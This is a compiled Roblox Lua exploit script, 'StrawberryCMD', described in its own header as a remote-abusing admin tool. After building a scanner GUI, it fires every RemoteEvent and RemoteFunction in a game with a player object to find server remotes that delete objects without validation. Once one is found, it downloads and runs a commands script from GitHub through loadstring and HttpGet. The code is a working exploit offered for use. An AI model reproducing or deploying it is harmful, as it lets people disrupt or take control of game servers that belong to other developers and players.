--# DO NOT EDIT, THIS IS NOT MENT TO BE EDITED. THIS IS A COMPILED VERSION OF SCANNER.RBXMX
--# IF YOU WANT TO MAKE CHANGES, EDIT SCANNER.RBXMX AND CONVERT IT BACK TO A SCANNER.LUA SCRIPT VIA GUI 2 LUA BY UNIQADEV
--# AND ADD THIS WARNING MESSAGE

local STRW = {};

-- Workspace.StrawMain
STRW["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"));
STRW["1"]["IgnoreGuiInset"] = true;
STRW["1"]["DisplayOrder"] = 2147483647;
STRW["1"]["ScreenInsets"] = Enum.ScreenInsets.DeviceSafeInsets;
STRW["1"]["Name"] = [[StrawMain]];
STRW["1"]["ResetOnSpawn"] = false;


-- Workspace.StrawMain.Scanner
STRW["2"] = Instance.new("Frame", STRW["1"]);
STRW["2"]["BorderSizePixel"] = 0;
STRW["2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STRW["2"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["2"]["Size"] = UDim2.new(0, 200, 0, 90);
STRW["2"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);
STRW["2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STRW["2"]["Name"] = [[Scanner]];
STRW["2"]["BackgroundTransparency"] = 1;


-- Workspace.StrawMain.Scanner.Glass
STRW["3"] = Instance.new("ImageLabel", STRW["2"]);
STRW["3"]["ZIndex"] = -2147483647;
STRW["3"]["BorderSizePixel"] = 0;
STRW["3"]["BackgroundColor3"] = Color3.fromRGB(67, 67, 67);
STRW["3"]["ImageTransparency"] = 0.11;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STRW["3"]["ImageColor3"] = Color3.fromRGB(171, 35, 62);
STRW["3"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["3"]["Image"] = [[rbxassetid://413422291]];
STRW["3"]["Size"] = UDim2.new(1, 0, 1, 0);
STRW["3"]["BackgroundTransparency"] = 1;
STRW["3"]["Name"] = [[Glass]];
STRW["3"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- Workspace.StrawMain.Scanner.Glass.UIGradient
STRW["4"] = Instance.new("UIGradient", STRW["3"]);



-- Workspace.StrawMain.Scanner.Glass.UICorner
STRW["5"] = Instance.new("UICorner", STRW["3"]);
STRW["5"]["CornerRadius"] = UDim.new(0, 10);


-- Workspace.StrawMain.Scanner.Shadow
STRW["6"] = Instance.new("ImageLabel", STRW["2"]);
STRW["6"]["ZIndex"] = -30;
STRW["6"]["BorderSizePixel"] = 0;
STRW["6"]["SliceCenter"] = Rect.new(200, 200, 500, 500);
STRW["6"]["SliceScale"] = 0.095;
STRW["6"]["ScaleType"] = Enum.ScaleType.Slice;
STRW["6"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STRW["6"]["ImageColor3"] = Color3.fromRGB(153, 153, 153);
STRW["6"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["6"]["Image"] = [[http://www.roblox.com/asset/?id=13960012399]];
STRW["6"]["Size"] = UDim2.new(1, 18, 1, 18);
STRW["6"]["BackgroundTransparency"] = 1;
STRW["6"]["Name"] = [[Shadow]];
STRW["6"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- Workspace.StrawMain.Scanner.Shadow.UIGradient
STRW["7"] = Instance.new("UIGradient", STRW["6"]);
STRW["7"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};


-- Workspace.StrawMain.Scanner.Gradient
STRW["8"] = Instance.new("Frame", STRW["2"]);
STRW["8"]["ZIndex"] = -1000;
STRW["8"]["BorderSizePixel"] = 0;
STRW["8"]["BackgroundColor3"] = Color3.fromRGB(162, 162, 162);
STRW["8"]["Size"] = UDim2.new(1, 0, 1, 0);
STRW["8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STRW["8"]["Name"] = [[Gradient]];
STRW["8"]["BackgroundTransparency"] = 0.9;


-- Workspace.StrawMain.Scanner.Gradient.UIGradient
STRW["9"] = Instance.new("UIGradient", STRW["8"]);
STRW["9"]["Rotation"] = -90;
STRW["9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 0),NumberSequenceKeypoint.new(0.469, 1),NumberSequenceKeypoint.new(1.000, 1)};


-- Workspace.StrawMain.Scanner.Gradient.UICorner
STRW["a"] = Instance.new("UICorner", STRW["8"]);
STRW["a"]["CornerRadius"] = UDim.new(0, 10);


-- Workspace.StrawMain.Scanner.UICorner
STRW["b"] = Instance.new("UICorner", STRW["2"]);
STRW["b"]["CornerRadius"] = UDim.new(0, 10);


-- Workspace.StrawMain.Scanner.Top
STRW["c"] = Instance.new("TextLabel", STRW["2"]);
STRW["c"]["BorderSizePixel"] = 0;
STRW["c"]["TextSize"] = 14;
STRW["c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STRW["c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Arial.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STRW["c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STRW["c"]["BackgroundTransparency"] = 1;
STRW["c"]["RichText"] = true;
STRW["c"]["Size"] = UDim2.new(1, 0, 0, 35);
STRW["c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STRW["c"]["Text"] = [[<b>Strawberry 🍓</b>: Scanner]];
STRW["c"]["Name"] = [[Top]];


-- Workspace.StrawMain.Scanner.UIDrag
STRW["d"] = Instance.new("LocalScript", STRW["2"]);
STRW["d"]["Name"] = [[UIDrag]];


-- Workspace.StrawMain.Scanner.ScanBtn
STRW["e"] = Instance.new("TextButton", STRW["2"]);
STRW["e"]["BorderSizePixel"] = 0;
STRW["e"]["TextSize"] = 14;
STRW["e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STRW["e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STRW["e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Italic);
STRW["e"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["e"]["BackgroundTransparency"] = 1;
STRW["e"]["Size"] = UDim2.new(0, 150, 0, 35);
STRW["e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STRW["e"]["Text"] = [[Scan]];
STRW["e"]["Name"] = [[ScanBtn]];
STRW["e"]["Position"] = UDim2.new(0.5, 0, 1, -35);


-- Workspace.StrawMain.Scanner.ScanBtn.UICorner
STRW["f"] = Instance.new("UICorner", STRW["e"]);
STRW["f"]["CornerRadius"] = UDim.new(0, 10);


-- Workspace.StrawMain.Scanner.ScanBtn.Glass
STRW["10"] = Instance.new("ImageLabel", STRW["e"]);
STRW["10"]["ZIndex"] = -2147483647;
STRW["10"]["BorderSizePixel"] = 0;
STRW["10"]["BackgroundColor3"] = Color3.fromRGB(26, 26, 26);
STRW["10"]["ImageTransparency"] = 0.11;
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STRW["10"]["ImageColor3"] = Color3.fromRGB(171, 35, 62);
STRW["10"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["10"]["Image"] = [[rbxassetid://413422291]];
STRW["10"]["Size"] = UDim2.new(1, 0, 1, 0);
STRW["10"]["BackgroundTransparency"] = 1;
STRW["10"]["Name"] = [[Glass]];
STRW["10"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- Workspace.StrawMain.Scanner.ScanBtn.Glass.UIGradient
STRW["11"] = Instance.new("UIGradient", STRW["10"]);



-- Workspace.StrawMain.Scanner.ScanBtn.Glass.UICorner
STRW["12"] = Instance.new("UICorner", STRW["10"]);
STRW["12"]["CornerRadius"] = UDim.new(0, 10);


-- Workspace.StrawMain.Scanner.ScanBtn.Shadow
STRW["13"] = Instance.new("ImageLabel", STRW["e"]);
STRW["13"]["ZIndex"] = -30;
STRW["13"]["BorderSizePixel"] = 0;
STRW["13"]["SliceCenter"] = Rect.new(200, 200, 500, 500);
STRW["13"]["SliceScale"] = 0.095;
STRW["13"]["ScaleType"] = Enum.ScaleType.Slice;
STRW["13"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STRW["13"]["ImageColor3"] = Color3.fromRGB(153, 153, 153);
STRW["13"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STRW["13"]["Image"] = [[http://www.roblox.com/asset/?id=13960012399]];
STRW["13"]["Size"] = UDim2.new(1, 18, 1, 18);
STRW["13"]["BackgroundTransparency"] = 1;
STRW["13"]["Name"] = [[Shadow]];
STRW["13"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- Workspace.StrawMain.Scanner.ScanBtn.Shadow.UIGradient
STRW["14"] = Instance.new("UIGradient", STRW["13"]);
STRW["14"]["Color"] = ColorSequence.new{ColorSequenceKeypoint.new(0.000, Color3.fromRGB(255, 52, 88)),ColorSequenceKeypoint.new(1.000, Color3.fromRGB(255, 52, 88))};


-- Workspace.StrawMain.Scanner.ScanBtn.Function
STRW["15"] = Instance.new("LocalScript", STRW["e"]);
STRW["15"]["Name"] = [[Function]];


-- Workspace.StrawMain.Scanner.StrawScan
STRW["16"] = Instance.new("LocalScript", STRW["2"]);
STRW["16"]["Name"] = [[StrawScan]];


-- Workspace.StrawMain.Scanner.UIDrag
local function C_d()
local script = STRW["d"];
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
	
end;
task.spawn(C_d);
-- Workspace.StrawMain.Scanner.ScanBtn.Function
local function C_15()
local script = STRW["15"];
	local TweenService = game:GetService("TweenService")
	local Button = script.Parent
	
	local Info = TweenInfo.new(0.15, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut)
	local CanClick = true
	
	Button.MouseEnter:Connect(function()
		if not CanClick then return end
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25})
		Tween:Play()
	end)
	
	Button.MouseLeave:Connect(function()
		if not CanClick then return end
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 1})
		Tween:Play()
	end)
	
	Button.MouseButton1Click:Connect(function()
		if not CanClick then return end
		CanClick = false
		
		local Tween = TweenService:Create(Button.Glass, Info, {BackgroundTransparency = 0.25})
		Tween:Play()
	end)
	
end;
task.spawn(C_15);
-- Workspace.StrawMain.Scanner.StrawScan
local function C_16()
local script = STRW["16"];
	--[========================================================================[
	      ⠀⠀⠀⠀⢀⡀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢀⠀⠀
		⠀⠀⠀⠀⠀⠀⣏⠓⠒⠤⣰⠋⠹⡄⠀⣠⠞⣿⠀⠀
		⠀⠀⠀⢀⠄⠂⠙⢦⡀⠐⠨⣆⠁⣷⣮⠖⠋⠉⠁⠀
		⠀⠀⡰⠁⠀⠮⠇⠀⣩⠶⠒⠾⣿⡯⡋⠩⡓⢦⣀⡀
		⠀⡰⢰⡹⠀⠀⠲⣾⣁⣀⣤⠞⢧⡈⢊⢲⠶⠶⠛⠁
		⢀⠃⠀⠀⠀⣌⡅⠀⢀⡀⠀⠀⣈⠻⠦⣤⣿⡀⠀⠀
		⠸⣎⠇⠀⠀⡠⡄⠀⠷⠎⠀⠐⡶⠁⠀⠀⣟⡇⠀⠀
		⡇⠀⡠⣄⠀⠷⠃⠀⠀⡤⠄⠀⠀⣔⡰⠀⢩⠇⠀⠀
		⡇⠀⠻⠋⠀⢀⠤⠀⠈⠛⠁⠀⢀⠉⠁⣠⠏⠀⠀⠀
		⣷⢰⢢⠀⠀⠘⠚⠀⢰⣂⠆⠰⢥⡡⠞⠁⠀⠀⠀⠀
		⠸⣎⠋⢠⢢⠀⢠⢀⠀⠀⣠⠴⠋⠀⠀⠀⠀⠀⠀⠀
		⠀⠘⠷⣬⣅⣀⣬⡷⠖⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
		⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
	
	    StrawberryCMD, the best remote abusing admin in Roblox.
	    Copyright (C) 2025 C:\Drive and Saji
	
		Last updated: 10/2/2025
			[+] Cleaned up the code
			[+] Made it Slightly faster
			[+] Better filtering system
			[+] Added support for RemoteFunctions
			[+] Fixed bad grammar (I'M LOOKING AT YOU SAJI)
			
		Credits: 
			C:\Drive - Owner | Cleaned up the scanner
			Saji - Co-Founder | Created the core scanner
			
		[!] PLEASE, IF YOU WANT TO CONTRIBUTE TO THIS SCRIPT
			SINCE THE CODE ISN'T THE BEST RIGHT NOW [!]
		
		Also sorry if the code looks like it's made from ChatGPT, I swear
		to god it's not. That's just how Saji codes and I'm just gonna
							     roll with it.
		
	--]========================================================================]
	
	--[[
		 __   ___   ___ ___   _   ___ _    ___ ___ 
		 \ \ / /_\ | _ \_ _| /_\ | _ ) |  | __/ __|
		  \ V / _ \|   /| | / _ \| _ \ |__| _|\__ \
		   \_/_/ \_\_|_\___/_/ \_\___/____|___|___/
	                  Boring stuff                               
	]]
	
	local ScanButton = script.Parent.ScanBtn --# Binded button to start scan
	local AlreadyScanned = false --# So they can't scan twice
	
	local MaxScanTime = 0.265 --# If the remote doesn't respond in this time it gets skipped
	
	--# Player related variables
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
	
	local CurrentVulnerableRemote = nil --# This is where the remote will be stored if found
	
	--[[
		  ___ _   _ _  _  ___ _____ ___ ___  _  _ ___ 
		 | __| | | | \| |/ __|_   _|_ _/ _ \| \| / __|
		 | _|| |_| | .` | (__  | |  | | (_) | .` \__ \
		 |_|  \___/|_|\_|\___| |_| |___\___/|_|\_|___/
					  Less boring stuff
	]]
	
	local function isDestroyed(obj)
		return not obj:IsDescendantOf(game)
	end --# Good way to check if a object got destroyed in runtime
	
	local function isEligible(rmevent)
		if rmevent ~= nil and rmevent.Parent ~= nil and rmevent.Parent.Name == "RobloxReplicatedStorage" then
			return false
		end
		if rmevent ~= nil and rmevent.Parent ~= nil and rmevent.Parent.Name == "DefaultChatSystemChatEvents" then
			return false
		end
		if rmevent ~= nil and rmevent.Parent.Parent ~= nil and rmevent.Parent.Parent.Name == "HDAdminClient" and rmevent.Parent.Name == "Signals" then
			return false
		end
		if rmevent:FindFirstChild("__FUNCTION") or rmevent.Name == "__FUNCTION" then
			return false
		end
		--# All of the above filters out the remotes that aren't usefull at all, decreasing the amount of false positives and making scan times faster in general
		
		return true --# If none apply it's eligible
	end
	
	local function isVulnerable(rmevent)
		--# Stage 1: TestPart Allocation (for feeding it to remote events)
	
		--# Attempts to get startergear which is a useless object we can use for testing
		local TestPart = LocalPlayer:FindFirstChild("StarterGear")
		if not TestPart then
			warn("StrawScan // StarterGear not found, replacing with char head")
			TestPart = Character:FindFirstChild("Head")
		end --# If startergear is not found, it will try to test with the chars head
	
		if not TestPart then
			error("StrawScan // TestPart could not be found!")
			return false
		end --# If failed to find a testpart the script will just kill itself basically
	
		--# Stage 2: Firing the remote and seeing if its vulnerable
		
		if rmevent:IsA("RemoteEvent") then --# Check if it is a remote event
			rmevent:FireServer(TestPart)
		elseif rmevent:IsA("RemoteFunction") then --# YES, ADDED SUPPORT FOR REMOTE FUNCTIONS, FINALLY
			coroutine.wrap(function()
				local success, result = pcall(function()
					rmevent:InvokeServer(TestPart)
				end)
			end)()
		end
	
		local t = tick()
		while tick() - t < MaxScanTime do
			if isDestroyed(TestPart) then
				print("StrawScan // Vulnerable remote found!: " .. rmevent:GetFullName())
				CurrentVulnerableRemote = rmevent
				return true
			end
	
			task.wait()
		end --# Actively checking if the remote event has responded
	
		--# If you got to this point, the remote wasn't vulnerable so we are returning false
		print("StrawScan // Remote not vulnerable: " .. rmevent:GetFullName())
		return false
	end --# Fully scans a remote event to check if it has a vulnerability
	
	--[[
		  ___  ___   _   _  _ _  _ ___ _  _  ___ 
		 / __|/ __| /_\ | \| | \| |_ _| \| |/ __|
		 \__ \ (__ / _ \| .` | .` || || .` | (_ |
		 |___/\___/_/ \_\_|\_|_|\_|___|_|\_|\___|
			   This is there the fun begins
	]]
	
	ScanButton.MouseButton1Click:Connect(function()
		if AlreadyScanned then return end
		AlreadyScanned = true
	
		local Remotes = {}
		local FoundRemote = false
	
		--# Goes through every remote in the game and checks if it is eligible, if so it adds it into a table
		for _, v in pairs(game:GetDescendants()) do
			if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
				if isEligible(v) then
					FoundRemote = true
					table.insert(Remotes, v)
				end
			end
		end
	
		if not FoundRemote then
			ScanButton.TextSize = 12 --# Sizing the font size down for the following message
			ScanButton.Text = "There's no remote events. Mb." --# WHO EVER MADE A GAME LIKE THIS, I HATE YOU
			
			wait(5)
			script.Parent.Parent:Destroy() --# Destroying the UI if there's no remotes
			
			return
		end
	
		--# Counting the amount of remotes in the queue
		ScanButton.Text = "Scanning... (0/" .. tostring(#Remotes) .. ")"
	
		--# Scans and counts every remote inside the queue
		for i, v in pairs(Remotes) do
			ScanButton.Text = "Scanning... (" .. tostring(i) .. "/" .. tostring(#Remotes) .. ")"
	
			local vulnerable = isVulnerable(v)
			if vulnerable then
				task.delay(0, function()
					ScanButton.TextSize = 12 --# Sizing it down for the following message
					ScanButton.Text = "Vuln found, booting up" --# Telling the pookie user that a vuln remote is found :happyface:
	
					local VulnRemote = Instance.new("ObjectValue") --# Creates a pointer for the vulnerable remote so the commands script can access the remote
					VulnRemote.Parent = LocalPlayer.PlayerGui
					VulnRemote.Name = "StrawberryHookedRM"
					VulnRemote.Value = CurrentVulnerableRemote
	
					loadstring(game:HttpGet("https://raw.githubusercontent.com/StrawberryRBLX/Strawberry-Scanner/refs/heads/main/release/commands.lua"))() --# Loads up the commands script
					task.wait(0.1) --# Waits before removing the scanner UI
					script.Parent.Parent:Destroy() --# Removes the scanner UI
				end)
	
				break
			end
		end
	
		if CurrentVulnerableRemote ~= nil and (CurrentVulnerableRemote:IsA("RemoteEvent") or CurrentVulnerableRemote:IsA("RemoteFunction")) then
			return
		end
	
		ScanButton.TextSize = 12 --# Sizing it down for the following message
		ScanButton.Text = "Sorry, no vuln remotes" -- Telling the pookie user that no remote is vulnurable :sadface:
		
		wait(5)
		
		script.Parent.Parent:Destroy() --# Destroying the UI if there's no vulnurable remotes
		
		return
	end) -- // CRAP LOGIC THAT HANDLES THE SCANNNINGGGGG
	
end;
task.spawn(C_16);

return STRW["1"], require;
